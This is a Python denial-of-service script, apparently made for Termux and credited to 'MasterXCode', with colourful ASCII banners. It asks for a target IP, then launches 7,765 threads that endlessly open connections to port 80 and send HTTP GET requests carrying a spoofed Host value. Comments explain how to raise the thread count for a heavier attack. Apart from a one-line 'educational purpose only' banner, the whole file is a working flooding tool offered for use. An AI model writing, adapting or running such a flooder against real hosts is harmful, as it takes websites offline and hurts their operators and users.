############--Modules--##############--MRX
import socket , threading , os
from time import sleep as se
from colorama import Back, Style
#####################################--MRX
##############--LOGO--############--MRX
os.system("clear")
print ("\n")
se(0.05)
print ("          \033[1;93m_________-----_____                    \033[1;91m{\033[1;93m*\033[1;91m} \033[1;92mThis is a powerful DOS Attack Script")
se(0.05)
print ("       \033[1;93m_____------           ___--   \033[1;97m----_       ")
se(0.05)
print ("\033[1;93m___----             ___------              \033[1;97m\     \033[1;91m{\033[1;96m*\033[1;91m} \033[1;96mAuthor \033[1;93m: \033[1;97mMasterXCode")
se(0.05)
print ("   \033[1;93m----________        ----                 \033[1;97m\    ")
se(0.05)
print ("               \033[1;93m-----__    \033[1;97m|             _____)   \033[1;93m{\033[1;91m*\033[1;93m} \033[1;95mNOTE \033[1;93m:")
se(0.05)
print ("                    \033[1;93m__-                \033[1;97m/     \   \033[1;90myou can edit the number of threads")
se(0.05)
print ("       \033[1;93m _______-----    ___--          \033[1;97m\    /)\  \033[1;90mbut don't exceed \033[1;91m500,000 \033[1;90m")
se(0.05)
print ("  \033[1;93m------_______      ---____            \033[1;97m\__/  /  \033[1;90mto avoid crashing of your device   ")
se(0.05)
print ("               \033[1;93m-----__    \033[1;97m\ \033[1;97m--    _          \033[1;97m/\      ")
se(0.05)
print ("                      \033[1;93m--__--__     \033[1;97m\_____/   \_/\           ")
se(0.05)
print ("                              \033[1;93m----\033[1;97m|   /          |          ")
se(0.05)
print ("                                  \033[1;97m|  |___________|    \033[1;92m+ \033[1;96mYou can also show the number of threads      ")
se(0.05)
print ("                                  \033[1;97m|  \033[1;91m| ((_(_)| )_)    \033[1;91mbut it may slow down your attack        ")
se(0.05)
print ("                                  \033[1;97m|  \033[1;91m\_((_(_)|/(_)          ")
se(0.05)
print ("                                  \033[1;97m\             (                     ")
se(0.05)
print ("                                   \033[1;97m\_____________)                    ")
se(0.05)
print ("\033[1;91m")
print (Back.RED + " \033[1;97mTHIS IS FOR EDUCATIONAL PURPOSE ONLY . DO NOT HARM ANYONE ELSE'S WEBSITE " + Style.RESET_ALL)
print ("\033[1;91m")
se(0.03)
print ("         ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗        [ \033[1;97mTermux Version \033[1;91m]")
se(0.03)
print ("         ╢                                  \033[1;97mV1.0  \033[1;91m╟")
se(0.03)
print ("         ╢     \033[1;93m┏━╸╻ ╻┏━┓┏━┓╺┳╸┏━┓╻╺┳┓┏━╸┏━┓       \033[1;91m╟")
se(0.03)
print ("  --==|||╢     \033[1;93m┃╺┓┣━┫┃ ┃┗━┓ ┃ ┣┳┛┃ ┃┃┣╸ ┣┳┛       \033[1;91m╟|||==--")
se(0.03)
print ("         ╢     \033[1;93m┗━┛╹ ╹┗━┛┗━┛ ╹ ╹┗╸╹╺┻┛┗━╸╹┗╸ \033[1;96mDDOS  \033[1;91m╟")
se(0.03)
print ("         ╢                                        ╟")
se(0.03)
print ("         ╚╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╝")
print ("               |-|-|-|-|-|-|-|-|-|            ")
print ("              ╔╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╗          ")
se(0.03)
print ("              ╢                    ╟          ")
se(0.03)
print ("       --==|||╢    \033[1;93mTarget\033[1;91m--\033[1;93mIP      \033[1;91m╟|||==--   ")
se(0.03)
print ("              ╢                    ╟          ")
se(0.03)
print ("              ╚╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╝          ")
print ("               |-|-|-|-|-|-|-|-|-|            ")
#####################--THE-CODE--####################--MRX

########--Show-Numbers--##########--MRX

def num():
  global attack_num
  attack_num += 1
  print ("\033[1;91m{\033[1;93m*\033[1;91m} \033[1;97mSent\033[1;93m",attack_num,"\033[1;91mrequests\033[1;97m ...")

##################################--MRX

try:
  target = input("         \033[1;93mMRX\033[1;97m-\033[1;96m@\033[1;97m-\033[1;91m╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧╤╧\033[1;93m╤╧╤╧╤\033[1;96m╧╤╧╤\033[1;92m╧╤╧\033[1;93m{}\033[1;91m--\033[1;93m>\033[1;97m ")
  fake_ip = '182.21.20.32'
  port = 80
  attack_num = 0
  print ("\n\n  \033[1;91m{\033[1;93m*\033[1;91m} \033[1;97mStarted \033[1;91mDDOS \033[1;97m...\n")
  def attack():
      while True:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((target, port))
          s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
          s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
# Uncomment to show the number of sent requests ,But . it may slow down your attack
#          num()
          s.close()
# You can edit the number of threads
# But to Avoid crashing of the script & freezing of your device. you do not exceed the 500,000 threads
  for i in range(7765):
      thread = threading.Thread(target=attack)
      thread.start()
except KeyboardInterrupt :
  print ("\n \n  Ok, Goodbye 0_* \n ")

#####################################################--MRX
